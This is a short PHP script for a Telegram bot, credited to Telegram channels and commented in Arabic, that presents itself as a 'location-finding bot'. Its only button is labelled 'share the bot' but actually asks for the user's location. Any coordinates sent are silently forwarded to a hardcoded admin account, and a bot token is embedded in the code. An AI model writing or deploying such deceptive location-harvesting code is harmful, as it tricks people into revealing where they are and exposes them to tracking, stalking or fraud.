<?php

//\\ اذكر مصدر نشر ملف حقوق //\\

//\\ https://t.me/T_T_0_5 //\\

//\\ https://t.me/T_0_5_9 //\\

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$cid = $message->chat->id;
$mid = $message->message_id;
$text = $message->text;
$type = $message->chat->type;
$location = $message->location;

if (($text == "/start") && ($type == "private")) {
    bot("sendMessage", [
        "chat_id" => $cid,
        "reply_to_message_id" => $mid,
        "text" => "<b>مرحبا بك في بوت تحديد الموقع 😈</b>",
        "parse_mode" => "html",
        "reply_markup" => json_encode([
            "resize_keyboard" => true,
            "one_time_keyboard" => true,
            "keyboard" => [
                [["text" => "مشاركة البوت", "request_location" => true]]
            ]
        ])
    ]);
}

// التحقق من وجود بيانات الموقع
if (isset($location)) {
    $location_la = $location->latitude;
    $location_lo = $location->longitude;

    // إرسال رسالة تأكيد للمستخدم
    bot('sendMessage', [
        'chat_id' => $cid,
        "reply_to_message_id" => $mid,
        'parse_mode' => 'html',
        'text' => ""
    ]);
    // إعادة توجيه الرسالة إلى المسؤول
    $admin = '1485359699';  // استبدل بـ ID المسؤول
    bot('forwardMessage', [
        'chat_id' => $admin,
        'from_chat_id' => $cid,
        'message_id' => $mid,
    ]);
}

// دالة لإرسال الطلب إلى تليجرام
function bot($method, $data) {
    $url = "https://api.telegram.org/6983685602:AAHDEIDPZtOuqBSw72ANxIMoiOCvnORZ2MU/" . $method;
    $options = [
        'http' => [
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ],
    ];
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    return $result;
}
?>